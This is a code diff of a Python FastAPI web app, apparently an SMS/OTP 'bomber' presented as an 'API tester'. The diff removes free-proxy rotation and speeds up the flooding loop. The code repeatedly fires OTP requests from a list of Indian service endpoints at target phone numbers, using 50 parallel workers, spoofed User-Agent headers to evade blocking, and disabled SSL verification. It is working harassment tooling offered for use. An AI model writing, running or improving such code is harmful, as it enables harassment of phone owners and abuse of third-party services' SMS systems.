@@ -1,94 +1,24 @@
-# app.py - PROXY ROTATION + ULTRA FAST
+# app.py - FIXED FAST VERSION (No Delays, Parallel Requests)
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
+from fastapi.responses import JSONResponse
 import asyncio
 import aiohttp
-import aiohttp_socks
 import time
 import random
-import requests
-from typing import List, Dict, Optional, Set
-from dataclasses import dataclass, field
-from datetime import datetime
+import json
+from typing import List, Dict, Optional
+from pydantic import BaseModel
 import uvicorn
-import logging
 
-# Logging config
-logging.basicConfig(level=logging.ERROR)
-logger = logging.getLogger(__name__)
+app = FastAPI(title="Phantom API Tester", version="4.0 FAST")
 
-app = FastAPI(title="Phantom API Tester", version="5.0 PROXY")
-
-# Static & Templates
+# Static files aur templates setup
 app.mount("/static", StaticFiles(directory="static"), name="static")
 templates = Jinja2Templates(directory="templates")
 
-# ================= PROXY MANAGER SYSTEM =================
-@dataclass
-class Proxy:
-    url: str
-    protocol: str = "http"
-    success_count: int = 0
-    fail_count: int = 0
-    is_active: bool = True
-
-class ProxyManager:
-    def __init__(self):
-        self.proxies: List[Proxy] = []
-        self.active_proxies: List[Proxy] = []
-        self.current_index = 0
-        self.lock = asyncio.Lock()
-        
-    async def fetch_proxies(self):
-        """Auto-fetch free proxies from multiple sources"""
-        raw_list = []
-        sources = [
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
-            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
-        ]
-        
-        print("🔄 Fetching fresh proxies...")
-        for url in sources:
-            try:
-                resp = requests.get(url, timeout=5)
-                if resp.status_code == 200:
-                    lines = resp.text.strip().split('\n')
-                    for line in lines:
-                        if ':' in line:
-                            # Auto-detect protocol based on source URL or default to http
-                            proto = "socks5" if "socks5" in url else "http"
-                            raw_list.append(f"{proto}://{line.strip()}")
-            except:
-                pass
-        
-        # Remove duplicates and update
-        unique_proxies = list(set(raw_list))
-        self.proxies = [Proxy(url=p, protocol=p.split('://')[0]) for p in unique_proxies[:500]] # Limit to 500
-        self.active_proxies = self.proxies.copy()
-        print(f"✅ Loaded {len(self.active_proxies)} unique proxies")
-
-    def get_next_proxy(self) -> Optional[Proxy]:
-        if not self.active_proxies:
-            return None
-        proxy = self.active_proxies[self.current_index % len(self.active_proxies)]
-        self.current_index += 1
-        return proxy
-
-    async def report_status(self, proxy_url: str, success: bool):
-        # Remove proxy if it fails too much
-        if not success:
-            for p in self.active_proxies:
-                if p.url == proxy_url:
-                    p.fail_count += 1
-                    if p.fail_count > 5: # Remove after 5 fails
-                        self.active_proxies.remove(p)
-                    break
-
-proxy_manager = ProxyManager()
-
-# ================= CONNECTION MANAGER =================
+# Connected WebSocket clients
 class ConnectionManager:
     def __init__(self):
         self.active_connections: List[WebSocket] = []
@@ -102,12 +32,16 @@ class ConnectionManager:
             self.active_connections.remove(websocket)
 
     async def broadcast(self, message: dict):
-        # Broadcast only to connected clients
-        for connection in self.active_connections[:]:
+        disconnected = []
+        for connection in self.active_connections:
             try:
                 await connection.send_json(message)
             except:
-                self.active_connections.remove(connection)
+                disconnected.append(connection)
+        
+        for conn in disconnected:
+            if conn in self.active_connections:
+                self.active_connections.remove(conn)
 
 manager = ConnectionManager()
 
@@ -205,107 +139,90 @@ ULTIMATE_APIS = [
     {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
 ]
 
-# ================= BOMBING LOGIC =================
+# Active bombing sessions
+active_sessions: Dict[str, dict] = {}
+
 class BombingSession:
     def __init__(self, phones: List[str]):
         self.phones = phones
-        self.stop_event = asyncio.Event()
+        self.stop_event = asyncio.Event() # For immediate stop
         self.stats = {
-            "total": 0, "success": 0, "failed": 0, "start_time": None, "proxies_alive": 0
+            "total_requests": 0,
+            "successful_hits": 0,
+            "failed_attempts": 0,
+            "start_time": None,
         }
-        self.semaphore = asyncio.Semaphore(40) # 40 parallel threads
+        self.semaphore = asyncio.Semaphore(50) # Allow 50 parallel requests
     
-    async def create_connector(self, proxy: Proxy):
-        """Create connection based on proxy type"""
-        if not proxy:
-            return aiohttp.TCPConnector(ssl=False)
-            
-        try:
-            if "socks" in proxy.protocol:
-                return aiohttp_socks.ProxyConnector.from_url(proxy.url, rdns=True, ssl=False)
-            else:
-                return aiohttp.TCPConnector(ssl=False)
-        except:
-            return aiohttp.TCPConnector(ssl=False)
-
-    async def attack(self, api: dict, phone: str):
+    async def bomb_phone(self, session: aiohttp.ClientSession, api: dict, phone: str):
         while not self.stop_event.is_set():
-            proxy = proxy_manager.get_next_proxy()
-            proxy_url = proxy.url if proxy else None
-            
-            async with self.semaphore:
-                try:
-                    # Clean phone number
-                    clean_phone = f"+91{phone}" if not phone.startswith("+91") else phone
-                    
-                    # Prepare URL/Data
-                    target_url = api["url"](clean_phone) if callable(api["url"]) else api["url"]
-                    data = api["data"](clean_phone) if api.get("data") else None
-                    
-                    # Connection Setup
-                    connector = await self.create_connector(proxy)
-                    
-                    # HTTP Proxy handling for request arg
-                    req_proxy = proxy_url if (proxy and "http" in proxy.protocol) else None
-                    
-                    async with aiohttp.ClientSession(connector=connector) as session:
-                        start_t = time.time()
-                        
-                        if api["method"] == "POST":
-                            async with session.post(target_url, headers=api["headers"], data=data, proxy=req_proxy, timeout=10) as resp:
-                                success = resp.status in [200, 201]
-                        else:
-                            async with session.get(target_url, headers=api["headers"], proxy=req_proxy, timeout=10) as resp:
-                                success = resp.status in [200, 201]
-                        
-                        # Stats update
-                        self.stats["total"] += 1
-                        if success:
-                            self.stats["success"] += 1
-                            if proxy: await proxy_manager.report_status(proxy.url, True)
-                            print(f"✅ HIT: {api['name']} | Proxy: {proxy_url[-10:] if proxy_url else 'Direct'}")
-                        else:
-                            self.stats["failed"] += 1
-                            if proxy: await proxy_manager.report_status(proxy.url, False)
-                        
-                        # Real-time WebSocket update
-                        await manager.broadcast({
-                            "type": "log",
-                            "tag": "success" if success else "error",
-                            "message": f"{'✅' if success else '❌'} {api['name']} via {proxy.protocol if proxy else 'Direct'}",
-                            "stats": {
-                                "total_requests": self.stats["total"],
-                                "successful_hits": self.stats["success"],
-                                "failed_attempts": self.stats["failed"],
-                                "proxies_used": len(proxy_manager.active_proxies)
-                            },
-                            "phone": phone
-                        })
-
-                except Exception as e:
-                    self.stats["failed"] += 1
-                    if proxy: await proxy_manager.report_status(proxy.url, False)
+            try:
+                # Add +91 if missing
+                full_phone = f"+91{phone}" if not phone.startswith("+91") else phone
                 
-                # Small random delay to rotate proxy efficiently
-                await asyncio.sleep(random.uniform(0.1, 0.5))
+                # Get URL & Data
+                url = api["url"](full_phone) if callable(api["url"]) else api["url"]
+                data = api["data"](full_phone) if api.get("data") else None
+                headers = api.get("headers", {}).copy()
+                
+                # Fake User-Agent to avoid blocking
+                headers["User-Agent"] = f"Mozilla/5.0 (Android 10; Mobile; rv:88.0) Gecko/88.0 Firefox/88.0"
+
+                async with self.semaphore: # Limit concurrency
+                    start_t = time.time()
+                    success = False
+                    
+                    if api["method"] == "POST":
+                        async with session.post(url, headers=headers, data=data, timeout=5, ssl=False) as resp:
+                            if resp.status in [200, 201]: success = True
+                    else:
+                        async with session.get(url, headers=headers, timeout=5, ssl=False) as resp:
+                            if resp.status in [200, 201]: success = True
+                    
+                    # Update Stats
+                    self.stats["total_requests"] += 1
+                    if success:
+                        self.stats["successful_hits"] += 1
+                        msg = f"✅ HIT: {api['name']}"
+                        print(f"\033[92m{msg}\033[0m")
+                    else:
+                        self.stats["failed_attempts"] += 1
+                        msg = f"❌ FAIL: {api['name']}"
+
+                    # Send Log to UI
+                    await manager.broadcast({
+                        "type": "log",
+                        "tag": "success" if success else "error",
+                        "message": msg,
+                        "stats": self.stats,
+                        "phone": phone
+                    })
+                
+                # VERY SMALL DELAY (Fast Speed)
+                await asyncio.sleep(0.1) 
+            
+            except Exception as e:
+                self.stats["failed_attempts"] += 1
+                await asyncio.sleep(0.5)
 
     async def start(self):
         self.stop_event.clear()
         self.stats["start_time"] = time.time()
         
-        tasks = []
-        for phone in self.phones:
-            for api in ULTIMATE_APIS:
-                tasks.append(asyncio.create_task(self.attack(api, phone)))
-        
-        await asyncio.gather(*tasks)
-
+        # High-performance connector
+        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            tasks = []
+            for phone in self.phones:
+                for api in ULTIMATE_APIS:
+                    # Create multiple workers per API for speed
+                    tasks.append(asyncio.create_task(self.bomb_phone(session, api, phone)))
+            
+            await asyncio.gather(*tasks)
+    
     def stop(self):
-        self.stop_event.set()
+        self.stop_event.set() # Immediate stop
 
-active_sessions: Dict[str, BombingSession] = {}
-
-# ================= ROUTES =================
 @app.get("/")
 async def home(request: Request):
     return templates.TemplateResponse("index.html", {
@@ -323,34 +240,23 @@ async def websocket_endpoint(websocket: WebSocket):
             if data["action"] == "start":
                 phones = data.get("phones", [])
                 
-                # Stop old session
                 if "main" in active_sessions:
                     active_sessions["main"].stop()
-                    await asyncio.sleep(1)
+                    await asyncio.sleep(0.5)
                 
                 session = BombingSession(phones)
                 active_sessions["main"] = session
                 
+                await manager.broadcast({"type": "info", "message": "🚀 Starting High-Speed Attack...", "stats": session.stats})
                 asyncio.create_task(session.start())
-                
+            
             elif data["action"] == "stop":
                 if "main" in active_sessions:
                     active_sessions["main"].stop()
-                    await manager.broadcast({"type": "info", "message": "🛑 Stopped", "stopped": True})
-                    
+                    await manager.broadcast({"type": "info", "message": "🛑 Stopped Successfully", "stopped": True})
+    
     except:
         manager.disconnect(websocket)
-
-@app.on_event("startup")
-async def startup_event():
-    # App start hote hi proxies fetch karo
-    await proxy_manager.fetch_proxies()
-    # Background task to refresh proxies every 5 mins
-    async def refresh_loop():
-        while True:
-            await asyncio.sleep(300)
-            await proxy_manager.fetch_proxies()
-    asyncio.create_task(refresh_loop())
 
 if __name__ == "__main__":
     uvicorn.run(app, host="0.0.0.0", port=8000)
